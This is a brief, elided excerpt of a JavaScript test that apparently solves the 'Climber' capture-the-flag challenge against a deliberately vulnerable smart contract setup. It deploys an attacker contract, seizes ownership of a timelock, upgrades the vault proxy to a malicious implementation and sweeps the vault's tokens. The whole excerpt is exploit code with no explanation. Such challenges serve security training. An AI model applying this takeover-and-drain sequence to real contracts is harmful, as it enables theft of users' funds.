...
describe('[Challenge] Climber', function () {
	...
	const PwnFactory = await ethers.getContractFactory('PwnClimber', attacker);
	this.pwn = await PwnFactory.deploy(this.timelock.address, this.vault.address, attacker.address);
	await this.pwn.gainOwnership();
	this.evil = await upgrades.upgradeProxy(
	    this.vault.address,
	    await ethers.getContractFactory('PwnClimberVault', attacker)
	);
	this.evil.sweepFunds(this.token.address)
    });
